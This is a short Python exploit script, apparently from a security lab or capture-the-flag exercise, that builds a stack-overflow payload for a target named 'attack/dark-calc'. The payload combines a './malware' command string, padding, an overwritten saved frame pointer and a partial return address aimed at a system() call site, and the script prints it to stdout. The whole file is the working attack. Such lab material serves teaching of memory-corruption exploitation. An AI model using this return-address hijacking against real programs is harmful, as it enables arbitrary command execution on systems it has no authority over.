#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

SYSTEM_CALL_SITE = 0x401A6B
MAIN_SAVED_RBP_SLOT = 0x721000800FF0

payload = (
    b"./malware\x00"
    + b"A" * 6
    + MAIN_SAVED_RBP_SLOT.to_bytes(8, "little")
    + SYSTEM_CALL_SITE.to_bytes(8, "little")[:-1]
)

assert b"\n" not in payload
sys.stdout.buffer.write(payload)


